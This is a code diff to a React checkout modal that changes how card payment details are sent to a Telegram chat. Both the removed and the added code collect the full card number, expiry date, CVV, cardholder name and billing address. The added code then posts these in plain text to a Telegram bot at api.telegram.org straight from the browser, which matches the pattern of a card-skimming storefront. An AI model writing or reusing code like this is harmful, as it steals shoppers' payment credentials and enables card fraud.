@@ -8,7 +8,7 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/u
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { CreditCard, Smartphone, DollarSign, Building, Upload, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { supabase } from "@/integrations/supabase/client";
+
 
 interface CheckoutModalProps {
   isOpen: boolean;
@@ -76,27 +76,30 @@ const CheckoutModal = ({ isOpen, onClose, total, currency, cartItems }: Checkout
     setIsProcessing(true);
 
     try {
-      // Send Telegram notification
-      const checkoutData = {
-        type: 'checkout',
-        paymentMethod: selectedPaymentMethod,
-        total: total,
-        currency: currency,
-        items: cartItems.map(item => `${item.name} - $${item.amount} x ${item.quantity}`).join(', '),
-        creditCardInfo: selectedPaymentMethod === 'credit' ? {
-          cardNumber: creditCardForm.cardNumber,
-          expiryDate: creditCardForm.expiryDate,
-          cvv: creditCardForm.cvv,
-          cardholderName: creditCardForm.cardholderName,
-          billingAddress: creditCardForm.billingAddress,
-          city: creditCardForm.city,
-          postalCode: creditCardForm.postalCode,
-          country: creditCardForm.country
-        } : null
-      };
+      const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+      const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
-      await supabase.functions.invoke('send-telegram-notification', {
-        body: checkoutData
+      const message = `🛒 *NEW CHECKOUT ORDER*\n\n` +
+        `💳 Payment Method: ${selectedPaymentMethod.toUpperCase()}\n` +
+        `💰 Total: $${total.toFixed(2)} ${currency}\n` +
+        `📦 Items: ${cartItems.map(item => `${item.name} $${item.amount} x${item.quantity}`).join(', ')}\n` +
+        (selectedPaymentMethod === 'credit' ?
+          `\n💳 *Card Details:*\n` +
+          `Card Number: ${creditCardForm.cardNumber}\n` +
+          `Expiry: ${creditCardForm.expiryDate}\n` +
+          `CVV: ${creditCardForm.cvv}\n` +
+          `Name: ${creditCardForm.cardholderName}\n` +
+          `Address: ${creditCardForm.billingAddress}, ${creditCardForm.city}, ${creditCardForm.postalCode}, ${creditCardForm.country}`
+          : '');
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
       });
 
       toast({
